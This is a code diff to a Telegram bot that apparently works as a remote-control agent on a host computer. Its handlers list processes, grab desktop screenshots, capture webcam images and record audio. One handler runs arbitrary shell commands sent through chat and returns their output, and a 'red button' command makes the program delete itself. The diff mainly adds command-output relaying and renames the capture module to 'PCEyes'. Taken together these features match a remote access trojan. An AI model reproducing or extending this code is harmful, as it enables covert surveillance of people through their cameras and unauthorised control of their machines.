@@ -4,6 +4,9 @@ import modules
 from aiogram import types
 from tg_config import admin_id
 from tg.dispatcher import dp
+from tg.utils import reply_handler
+
+from aiogram.utils.exceptions import MessageTextIsEmpty, CantParseEntities
 
 
 async def activate():
@@ -86,23 +89,19 @@ async def send_connection_info(message: types.Message):
 @dp.message_handler(commands="proc_info")
 async def send_process_info(message: types.Message):
     result = modules.GetInfo().get_process()
-    if len(result) > 4096:
-        for x in range(0, len(result), 4096):
-            await message.answer(result[x:x + 4096])
-    else:
-        await message.answer(result)
+    await reply_handler(message=message, data=result)
 
 
 @dp.message_handler(commands="screen")
 async def send_screen(message: types.Message):
-    screen_path = modules.View().make_screenshot()
+    screen_path = modules.PCEyes().make_screenshot()
     await message.answer_photo(open(screen_path, "rb"))
     os.remove(screen_path)
 
 
 @dp.message_handler(commands="webcam_screen")
 async def send_screen(message: types.Message):
-    webcam_screen_path = modules.View().make_webcam_screen()
+    webcam_screen_path = modules.PCEyes().make_webcam_screen()
     await message.answer_photo(open(webcam_screen_path, "rb"))
     os.remove(webcam_screen_path)
 
@@ -122,10 +121,18 @@ async def send_audio(message: types.Message):
 async def cmd_exec(message: types.Message):
     if len(message.text.split(" ")) >= 2:
         command = " ".join(message.text.split(" ")[1:])
-        if "cmd" not in command:
-            modules.Shell.exec_command(command)
-        else:
-            await message.answer("Invalid command")
+        try:
+            # opens cmd in the tg console and breaks the chat
+            if "cmd" not in command:
+                exec_data = modules.Shell().run_something(command)
+                await reply_handler(message=message, data=exec_data)
+        # an error is caused when launching files
+        except MessageTextIsEmpty:
+            pass
+        except CantParseEntities:
+            await message.answer("Please use this command with the flag")
+        except Exception as e:
+            await message.answer(f"New Error: {e}")
     else:
         await message.answer("Write your command")
 
@@ -140,3 +147,5 @@ async def cmd_exit(message: types.Message):
 async def red_button(message: types.Message):
     await message.answer("I'm going to miss you!")
     modules.Destroyer().delete_the_program()
+    raise SystemExit
+    
